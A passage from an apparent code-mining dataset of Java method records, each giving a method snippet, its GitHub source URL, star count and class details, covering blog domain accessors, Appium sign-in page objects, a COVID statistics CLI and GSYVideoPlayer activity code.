"stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getSlug", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getSlug() {        return slug;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setSlug", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSlug(String slug) {        this.slug = slug;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getType() {        return type;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setType(String type) {        this.type = type;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getContentType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getContentType() {        return contentType;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setContentType", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setContentType(String contentType) {        this.contentType = contentType;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getDescription", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {        return description;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setDescription", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {        this.description = description;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getSort", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getSort() {        return sort;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setSort", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setSort(Integer sort) {        this.sort = sort;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "getParent", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getParent() {        return parent;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "setParent", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setParent(Integer parent) {        this.parent = parent;    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/Domin/MetaDomain.java", "stars": "2", "class": {"name": "MetaDomain", "extends": null, "implements": ["Serializable"], "modifiers": ["public"]}}, {"method_name": "enterUserName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void enterUserName(String emailVal) {\t\tthis.email.clear();\t    this.email.sendKeys(emailVal);\t}", "url": "https://raw.githubusercontent.com/vanitha128/appiumTests/master/src/main/java/pageObjects/SignInPage.java", "stars": "2", "class": {"name": "SignInPage", "extends": "PageObject", "implements": null, "modifiers": ["public"]}}, {"method_name": "enterPassword", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void enterPassword(String passwordVal) {\t\tthis.password.sendKeys(passwordVal);\t}", "url": "https://raw.githubusercontent.com/vanitha128/appiumTests/master/src/main/java/pageObjects/SignInPage.java", "stars": "2", "class": {"name": "SignInPage", "extends": "PageObject", "implements": null, "modifiers": ["public"]}}, {"method_name": "clickSubmitButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void clickSubmitButton() {\t\tthis.submitButton.click();\t}", "url": "https://raw.githubusercontent.com/vanitha128/appiumTests/master/src/main/java/pageObjects/SignInPage.java", "stars": "2", "class": {"name": "SignInPage", "extends": "PageObject", "implements": null, "modifiers": ["public"]}}, {"method_name": "isInitialized", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isInitialized() {\t\treturn email.isDisplayed();\t}", "url": "https://raw.githubusercontent.com/vanitha128/appiumTests/master/src/main/java/pageObjects/SignInPage.java", "stars": "2", "class": {"name": "SignInPage", "extends": "PageObject", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        VideoContext videoContext = new VideoContext();        videoContext.setVideoState(new VideoPlayState());        System.out.println(\"\u5f53\u524d\u72b6\u6001\uff1a\" + videoContext.getVideoState().getClass().getSimpleName());        videoContext.pause();        System.out.println(\"\u5f53\u524d\u72b6\u6001\uff1a\" + videoContext.getVideoState().getClass().getSimpleName());        videoContext.speed();        System.out.println(\"\u5f53\u524d\u72b6\u6001\uff1a\" + videoContext.getVideoState().getClass().getSimpleName());        videoContext.close();        System.out.println(\"\u5f53\u524d\u72b6\u6001\uff1a\" + videoContext.getVideoState().getClass().getSimpleName());        videoContext.speed();    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/state/VideoStateTest.java", "stars": "2", "class": {"name": "VideoStateTest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        int exitCode = new CommandLine(new Covid19Cli()).execute(args);        System.exit(exitCode);    }", "url": "https://raw.githubusercontent.com/aboullaite/covid-19-picocli/master/src/main/java/me/aboullaite/Covid19Cli.java", "stars": "3", "class": {"name": "Covid19Cli", "extends": null, "implements": ["Callable"], "modifiers": ["public"]}}, {"method_name": "call", "params": [], "throws": ["Exception"], "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer call() throws Exception {        if (this.all && !this.country.equals(\"all\")){            System.out.println(Ansi.AUTO.string(\"@|bold,red, ****** Cannot combine global (`-a`) and country (`-c`) options ****** |@\\n\"));            return 1;        }        this.colorise(this.country);        if(this.graph){            PrintUtils.printGrapgh(covidAPI.history(this.country));            return 0;        }        if (this.all){            PrintUtils.printCountryStatTable(covidAPI.allCountryStats());            return 0;        }        if(this.country.equals(\"all\")) {            PrintUtils.printGlobalTable(Arrays.asList(covidAPI.globalStats()));            return 0;        }        PrintUtils.printCountryStatTable(Arrays.asList(covidAPI.countryStats(this.country)));        return 0;    }", "url": "https://raw.githubusercontent.com/aboullaite/covid-19-picocli/master/src/main/java/me/aboullaite/Covid19Cli.java", "stars": "3", "class": {"name": "Covid19Cli", "extends": null, "implements": ["Callable"], "modifiers": ["public"]}}, {"method_name": "colorise", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void colorise(String country){        String text = country.equalsIgnoreCase(\"all\") ? \"Global\" : country;        String str = Ansi.AUTO.string(\"@|bold,green, ****** Printing %s's data ****** |@\\n\");        System.out.printf(str, text);    }", "url": "https://raw.githubusercontent.com/aboullaite/covid-19-picocli/master/src/main/java/me/aboullaite/Covid19Cli.java", "stars": "3", "class": {"name": "Covid19Cli", "extends": null, "implements": ["Callable"], "modifiers": ["public"]}}, {"method_name": "getCurrentPassword", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getCurrentPassword() {        return currentPassword;    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/dto/PasswordChangeDTO.java", "stars": "2", "class": {"name": "PasswordChangeDTO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setCurrentPassword", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCurrentPassword(String currentPassword) {        this.currentPassword = currentPassword;    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/dto/PasswordChangeDTO.java", "stars": "2", "class": {"name": "PasswordChangeDTO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNewPassword", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getNewPassword() {        return newPassword;    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/dto/PasswordChangeDTO.java", "stars": "2", "class": {"name": "PasswordChangeDTO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setNewPassword", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setNewPassword(String newPassword) {        this.newPassword = newPassword;    }", "url": "https://raw.githubusercontent.com/gardle/gardle-web/master/src/main/java/com/gardle/service/dto/PasswordChangeDTO.java", "stars": "2", "class": {"name": "PasswordChangeDTO", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getShader", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {        this.mGlSurfaceViewl = mGlSurfaceView;        String shader =                \"#extension GL_OES_EGL_image_external : require\\n\"                        + \"precision mediump float;\\n\"                        + \"varying vec2 vTextureCoord;\\n\"                        + \"uniform samplerExternalOES sTexture;\\n\"                        + \"uniform sampler2D sTexture2;\\n\"                        + \"void main() {\\n\"                        + \"  vec4 c1 = texture2D(sTexture2, vTextureCoord);\\n\"                        + \"  gl_FragColor = vec4(c1.rgb, c1.a *\" + mAlpha + \");\\n\"                        + \"}\\n\";        return shader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "setPositionX", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPositionX(float positionX) {        this.mPositionX = positionX;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "setPositionY", "params": ["float"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPositionY(float positionY) {        this.mPositionY = positionY;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getAlpha", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getAlpha() {        return mAlpha;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getPositionOffset", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getPositionOffset() {        return mPositionOffset;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getWidth", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getWidth() {        return (float) mWidth;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getHeight", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getHeight() {        return (float) mHeight;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getScaleW", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getScaleW() {        return getWidth() / mGlSurfaceViewl.getWidth();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getScaleH", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getScaleH() {        return getHeight() / mGlSurfaceViewl.getHeight();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getPositionX", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getPositionX() {        if (mPositionX != NEVER_SET) {            return mPositionX;        }        return -(mGlSurfaceViewl.getWidth() / (getWidth()) - mPositionOffset);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getPositionY", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getPositionY() {        if (mPositionY != NEVER_SET) {            return mPositionY;        }        return -(mGlSurfaceViewl.getHeight() / (getHeight()) - mPositionOffset);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getMaxPositionX", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getMaxPositionX() {        return mGlSurfaceViewl.getWidth() / (getWidth()) - mPositionOffset;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getMaxPositionY", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getMaxPositionY() {        return mGlSurfaceViewl.getHeight() / (getHeight()) - mPositionOffset;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getMinPositionX", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getMinPositionX() {        return -(mGlSurfaceViewl.getWidth() / (getWidth()) - mPositionOffset);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getMinPositionY", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float getMinPositionY() {        return -(mGlSurfaceViewl.getHeight() / (getHeight()) - mPositionOffset);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "getBitmap", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Bitmap", "snippet": "    public Bitmap getBitmap() {        return mBitmap;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/BitmapIconEffect.java", "stars": "2", "class": {"name": "BitmapIconEffect", "extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"method_name": "onLoadingDrawableSet", "params": ["Drawable"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onLoadingDrawableSet(Drawable imageDrawable) {\t\tif (null != imageDrawable) {\t\t\tfinal int dHeight = imageDrawable.getIntrinsicHeight();\t\t\tfinal int dWidth = imageDrawable.getIntrinsicWidth();\t\t\t/**\t\t\t * We need to set the width/height of the ImageView so that it is\t\t\t * square with each side the size of the largest drawable dimension.\t\t\t * This is so that it doesn't clip when rotated.\t\t\t */\t\t\tViewGroup.LayoutParams lp = mHeaderImage.getLayoutParams();\t\t\tlp.width = lp.height = Math.max(dHeight, dWidth);\t\t\tmHeaderImage.requestLayout();\t\t\t/**\t\t\t * We now rotate the Drawable so that is at the correct rotation,\t\t\t * and is centered.\t\t\t */\t\t\tmHeaderImage.setScaleType(ScaleType.MATRIX);\t\t\tMatrix matrix = new Matrix();\t\t\tmatrix.postTranslate((lp.width - dWidth) / 2f, (lp.height - dHeight) / 2f);\t\t\tmatrix.postRotate(getDrawableRotationAngle(), lp.width / 2f, lp.height / 2f);\t\t\tmHeaderImage.setImageMatrix(matrix);\t\t}\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPullImpl", "params": ["float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onPullImpl(float scaleOfLayout) {\t\t// NO-OP\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "pullToRefreshImpl", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void pullToRefreshImpl() {\t\t// Only start reset Animation, we've previously show the rotate anim\t\tif (mRotateAnimation == mHeaderImage.getAnimation()) {\t\t\tmHeaderImage.startAnimation(mResetRotateAnimation);\t\t}\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "refreshingImpl", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void refreshingImpl() {\t\tmHeaderImage.clearAnimation();\t\tmHeaderImage.setVisibility(View.INVISIBLE);\t\tmHeaderProgress.setVisibility(View.VISIBLE);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "releaseToRefreshImpl", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void releaseToRefreshImpl() {\t\tmHeaderImage.startAnimation(mRotateAnimation);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "resetImpl", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void resetImpl() {\t\tmHeaderImage.clearAnimation();\t\tmHeaderProgress.setVisibility(View.GONE);\t\tmHeaderImage.setVisibility(View.VISIBLE);\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDefaultDrawableResId", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "int", "snippet": "\tprotected int getDefaultDrawableResId() {\t\treturn R.drawable.default_ptr_flip;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "getDrawableRotationAngle", "params": [], "throws": null, "modifiers": ["private"], "return_type": "float", "snippet": "\tprivate float getDrawableRotationAngle() {\t\tfloat angle = 0f;\t\tswitch (mMode) {\t\t\tcase PULL_FROM_END:\t\t\t\tif (mScrollDirection == Orientation.HORIZONTAL) {\t\t\t\t\tangle = 90f;\t\t\t\t} else {\t\t\t\t\tangle = 180f;\t\t\t\t}\t\t\t\tbreak;\t\t\tcase PULL_FROM_START:\t\t\t\tif (mScrollDirection == Orientation.HORIZONTAL) {\t\t\t\t\tangle = 270f;\t\t\t\t}\t\t\t\tbreak;\t\t\tdefault:\t\t\t\tbreak;\t\t}\t\treturn angle;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/internal/FlipLoadingLayout.java", "stars": "74", "class": {"name": "FlipLoadingLayout", "extends": "LoadingLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "onCreate", "params": ["Bundle"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_detail_audio_player);        ButterKnife.bind(this);        String url = getUrl();        resolveNormalVideoUI();        //\u5916\u90e8\u8f85\u52a9\u7684\u65cb\u8f6c\uff0c\u5e2e\u52a9\u5168\u5c4f        orientationUtils = new OrientationUtils(this, detailPlayer);        //\u521d\u59cb\u5316\u4e0d\u6253\u5f00\u5916\u90e8\u7684\u65cb\u8f6c        orientationUtils.setEnable(false);        detailPlayer.loadCoverImage(\"\", R.drawable.lololo);        Map<String, String> header = new HashMap<>();        header.put(\"ee\", \"33\");        header.put(\"allowCrossProtocolRedirects\", \"true\");        GSYVideoOptionBuilder gsyVideoOption = new GSYVideoOptionBuilder();        gsyVideoOption                .setIsTouchWiget(true)                .setRotateViewAuto(false)                .setLockLand(false)                .setAutoFullWithSize(false)                .setShowFullAnimation(false)                .setNeedLockFull(true)                .setUrl(url)                .setMapHeadData(header)                .setCacheWithPlay(false)                .setVideoTitle(\"\u6d4b\u8bd5\u89c6\u9891\")                .setVideoAllCallBack(new GSYSampleCallBack() {                    @Override                    public void onPrepared(String url, Object... objects) {                        Debuger.printfError(\"***** onPrepared **** \" + objects[0]);                        Debuger.printfError(\"***** onPrepared **** \" + objects[1]);                        super.onPrepared(url, objects);                        //\u5f00\u59cb\u64ad\u653e\u4e86\u624d\u80fd\u65cb\u8f6c\u548c\u5168\u5c4f                        orientationUtils.setEnable(true);                        isPlay = true;                        //\u8bbe\u7f6e seek \u7684\u4e34\u8fd1\u5e27\u3002                        if (detailPlayer.getGSYVideoManager().getPlayer() instanceof Exo2PlayerManager) {                            ((Exo2PlayerManager) detailPlayer.getGSYVideoManager().getPlayer()).setSeekParameter(SeekParameters.NEXT_SYNC);                            Debuger.printfError(\"***** setSeekParameter **** \");                        }                    }                    @Override                    public void onEnterFullscreen(String url, Object... objects) {                        super.onEnterFullscreen(url, objects);                        Debuger.printfError(\"***** onEnterFullscreen **** \" + objects[0]);//title                        Debuger.printfError(\"***** onEnterFullscreen **** \" + objects[1]);//\u5f53\u524d\u5168\u5c4fplayer                    }                    @Override                    public void onAutoComplete(String url, Object... objects) {                        super.onAutoComplete(url, objects);                    }                    @Override                    public void onClickStartError(String url, Object... objects) {                        super.onClickStartError(url, objects);                    }                    @Override                    public void onQuitFullscreen(String url, Object... objects) {                        super.onQuitFullscreen(url, objects);                        Debuger.printfError(\"***** onQuitFullscreen **** \" + objects[0]);//title                        Debuger.printfError(\"***** onQuitFullscreen **** \" + objects[1]);//\u5f53\u524d\u975e\u5168\u5c4fplayer                        if (orientationUtils != null) {                            orientationUtils.backToProtVideo();                        }                    }                })                .setLockClickListener(new LockClickListener() {                    @Override                    public void onClick(View view, boolean lock) {                        if (orientationUtils != null) {                            //\u914d\u5408\u4e0b\u65b9\u7684onConfigurationChanged                            orientationUtils.setEnable(!lock);                        }                    }                })                .setGSYVideoProgressListener(new GSYVideoProgressListener() {                    @Override                    public void onProgress(int progress, int secProgress, int currentPosition, int duration) {                        Debuger.printfLog(\" progress \" + progress + \" secProgress \" + secProgress + \" currentPosition \" + currentPosition + \" duration \" + duration);                    }                })                .build(detailPlayer);        detailPlayer.getFullscreenButton().setOnClickListener(new View.OnClickListener() {            @Override            public void onClick(View v) {                //\u76f4\u63a5\u6a2a\u5c4f                orientationUtils.resolveByClick();                //\u7b2c\u4e00\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfactionbar\uff0c\u7b2c\u4e8c\u4e2atrue\u662f\u5426\u9700\u8981\u9690\u85cfstatusbar                detailPlayer.startWindowFullscreen(AudioDetailPlayer.this, true, true);            }        });    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onBackPressed", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onBackPressed() {        if (orientationUtils != null) {            orientationUtils.backToProtVideo();        }        if (GSYVideoManager.backFromWindowFull(this)) {            return;        }        super.onBackPressed();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onPause", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onPause() {        getCurPlay().onVideoPause();        super.onPause();        isPause = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onResume", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onResume() {        getCurPlay().onVideoResume(false);        super.onResume();        isPause = false;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/AudioDetailPlayer.java", "stars": "2", "class": {"name": "AudioDetailPlayer", "extends": "AppCompatActivity", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onDestroy() {        super.onDestroy();        